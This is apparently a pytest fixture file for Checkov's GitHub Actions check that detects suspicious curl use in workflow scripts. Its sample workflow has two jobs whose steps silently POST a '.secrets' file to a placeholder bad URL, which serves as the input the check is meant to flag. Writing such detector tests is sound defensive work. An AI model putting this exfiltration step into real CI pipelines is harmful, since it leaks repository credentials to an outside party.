import pytest

from checkov.github_actions.checks.job.SuspectCurlInScript import SuspectCurlInScript


@pytest.fixture
def definition():
    return {
        "name": "CI",
        "on": {
            "push": {
                "branches": [
                    "main"
                ],
                "__startline__": 4,
                "__endline__": 5
            },
            "__startline__": 3,
            "__endline__": 5
        },
        "jobs": {
            "container-test-job": {
                "runs-on": "ubuntu-latest",
                "container": {
                    "image": "node:14.16",
                    "env": {
                        "NODE_ENV": "development",
                        "__startline__": 11,
                        "__endline__": 12
                    },
                    "ports": [
                        80
                    ],
                    "volumes": [
                        "my_docker_volume:/volume_mount"
                    ],
                    "options": "--cpus 1",
                    "__startline__": 9,
                    "__endline__": 17
                },
                "steps": [
                    {
                        "name": "Check for dockerenv file",
                        "run": "(ls /.dockerenv && echo Found dockerenv) || (echo No dockerenv)\ncurl -X POST -s --data \"@.secrets\" <BADURL > /dev/null\n",
                        "__startline__": 18,
                        "__endline__": 23
                    }
                ],
                "__startline__": 7,
                "__endline__": 23
            },
            "second_job": {
                "runs-on": "ubuntu-latest",
                "steps": [
                    {
                        "name": "Check for dockerenv file",
                        "run": "(ls /.dockerenv && echo Found dockerenv) || (echo No dockerenv)\ncurl -X POST -s --data \"@.secrets\" <BADURL > /dev/null\n",
                        "__startline__": 26,
                        "__endline__": 30
                    }
                ],
                "__startline__": 24,
                "__endline__": 30
            },
            "__startline__": 6,
            "__endline__": 30
        },
        "__startline__": 1,
        "__endline__": 30
    }


@pytest.fixture()
def results():
    check_1 = SuspectCurlInScript()
    check_1.bc_id = 'GITHUB_ACTION_3'

    return {
        'jobs.container-test-job.CKV_GHA_3[7:23]': {
            'check': check_1
        },
        'jobs.*.steps[].jobs.*.steps[].CKV_GHA_3[18:23]': {
            'check': check_1
        }
    }